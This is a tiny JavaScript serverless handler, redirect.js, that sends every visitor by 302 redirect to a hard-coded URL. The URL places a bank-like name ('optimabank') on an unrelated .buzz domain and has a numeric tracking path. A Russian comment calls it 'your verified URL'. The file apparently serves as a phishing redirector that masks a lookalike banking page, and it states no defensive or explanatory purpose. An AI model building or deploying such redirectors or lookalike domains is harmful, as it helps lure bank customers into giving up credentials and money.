// redirect.js
export default function handler(req, res) {
  const redirectUrl = "https://optimabank.deliversite-e.buzz/168082"; // твой проверенный URL
  res.writeHead(302, { Location: redirectUrl });
  res.end();
}
